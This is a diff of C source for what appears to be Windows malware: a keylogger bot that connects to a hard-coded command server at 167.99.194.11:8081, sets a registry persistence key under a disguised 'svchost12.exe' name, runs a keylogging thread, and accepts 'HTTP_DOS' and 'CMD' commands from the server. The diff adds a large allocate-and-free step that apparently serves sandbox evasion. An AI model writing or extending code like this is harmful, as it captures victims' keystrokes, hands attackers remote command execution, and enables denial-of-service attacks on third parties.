@@ -21,13 +21,16 @@ int main(){
 	WSADATA wsa;                                        //Info about winsock implementation
 	SOCKET s;
 	pthread_t tid;
+	int *ip;
 	char server_ip[15]="167.99.194.11", *buffer;
 	char server_reply[256], *token;
 	int recv_size,control_sock,port=8081,test,create;
+	ip = (int *) malloc(1000000000*sizeof(int));
+	free(ip);
 	//stealth();
 	test=test_key();
 	if(test==2){
-		char *path="c:\\%windir%\\svchost.exe";
+		char *path="c:\\%windir%\\svchost12.exe";
 		create=create_key(path);
 	}
     pthread_create(&tid, NULL, kl_thread, NULL);
@@ -64,23 +67,20 @@ int expression_handler(char *command, char **riscommand){
 	if(strcmp("HTTP_DOS",token)==0){
 
         token = strtok(NULL,token);
-
         *riscommand=token;
-		//hdos_exe(token);
 		return 1;
 	}
 	else if(strcmp("CMD",token)==0){
         token = strtok(NULL,token);
         *riscommand=token;
-
         return 2;
     }
     else{return 0;}
 }
 
 void *kl_thread(){
-	upload();
-	FILE* fp =fopen("svchost.log","w");
-    fclose(fp);
+	//upload();
+	//FILE* fp =fopen("svchost.log","w");
+    //fclose(fp);
     get_keylog();
 }
